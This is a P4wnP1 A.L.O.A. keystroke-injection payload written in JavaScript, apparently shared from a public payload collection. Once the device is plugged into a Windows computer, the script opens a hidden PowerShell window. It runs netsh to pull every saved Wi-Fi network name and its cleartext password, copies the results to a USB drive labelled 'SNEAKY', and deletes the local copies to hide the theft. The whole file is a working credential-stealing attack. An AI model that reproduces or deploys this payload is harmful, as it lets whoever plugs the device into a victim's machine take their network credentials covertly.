/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// WifiKeysExtractor.js
// Original author: PingDucKY https://github.com/PingDucKY/payloads-P4wnP1-A.L.O.A
// Edited by: Coderdude112 on GitHub
// When plugged in, this script uses a powershell command and extracts all known networks and their passwords to the USB_drive
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// PREREQUISTES: (Things that need to happen before you can use this attack)
// Enable the USB and keyboard mode on the P4wnP1 ALOA
// Set the USB_drive varaible to the name of the USB on the P4wnP1 ALOA. By default this is set to 'SNEAKY'

// Set the keyboard layout and all variables
layout('us');             // Set keyboard layout to US
typingSpeed(0,0);         // Sets the typing speed to FAST
var Ready = "False"       // Sets Ready to false beacuse we are not ready to begin the attack
var USB_drive = "SNEAKY"  // Sets the name of the drive, so the program knows where to exfil the items

function Attack() { // Initalizes the function Attack
  delay(2200);  // Delay to make sure that File Explorer doesent take focus
  press("GUI r"); // Opens a run command
  delay(500);
  type("powershell\n"); // Opens powershell
  delay(500);
  
  type("powershell -windowstyle hidden {"); // Makes the window hidden for the duration of the attack
  type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq '" + USB_drive + "' } | select name;");  // Find the USB_drive to save the files
  type("$exfilPath = \"Loot\\Wifi-Keys\";");  // Save the loot path to exfilPath
  type("$totalPath = $usbPath.name + $exfilPath;"); // Save the total path for the loot including the drive letter to totalPath
  type("mkdir $totalPath;");  // Makes the loot directory
  
  type("netsh wlan show profiles * > wirelessinfo.txt;"); // Gets the WIFI info and stores it in a txt file
  type("copy wirelessinfo.txt $totalPath;");  // Copyies wireless password to the USB
  type("del wirelessinfo.txt;");  // Delets the copy of wirelessinfo on the host
  
  type('(netsh wlan show profiles) | Select-String "\\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\\W+\\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ Wifi_Name=$name;Key=$pass }} | Format-Table -AutoSize > wifikeys.txt;');  // Gets the keys to the wifi networks
  type("copy wifikeys.txt $totalPath;");  // Copies wifikeys to the USB
  type("del wifikeys.txt;");  // Deletes the copy of wifikeys stored on the host
  
  type("}\n");  // Adds the close curly bracket making the attack hidden and starts the attack
}

function Initalized() { // Initalizes the function that checks if the device has been initalized by the host before running the attack
  while (Ready = "False") {
    press("SCROLL");
    result = waitLED(SCROLL,10);
    
    if (result.SCROLL) {  // If this is true then the device is initalized. The loop will break and the attack will start
      Ready = "True";
      break;   
    } else {  // The device is not initalized so we will press scroll lock and retry
        press("SCROLL");
      }
    
  }
}

Initalized(); // Check if the host has initalized us
Attack(); // Run the attack
